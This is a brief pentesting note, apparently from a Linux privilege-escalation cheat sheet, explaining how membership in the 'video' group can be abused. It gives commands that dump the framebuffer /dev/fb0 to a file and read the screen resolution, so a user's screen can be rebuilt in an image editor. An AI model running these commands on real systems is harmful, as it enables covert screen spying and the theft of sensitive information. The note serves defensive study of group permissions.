## Video Group

The **video** group controls access to video devices on the system, such as graphics cards and video capture devices.

## Attack

An attacker could use the **video** group permissions to spy on the screen of a user connected to the system and gather potentially sensitive information.

```bash
# Read a raw frame from the screen with
cat /dev/fb0 > /tmp/screen.raw

# To retrieve the screen resolution
cat /sys/class/graphics/fb0/virtual_size
```

From here, we could try to open the file with an image editor like GIMP to view the capture. (It’s important to remember the screen resolution to reconstruct it.)
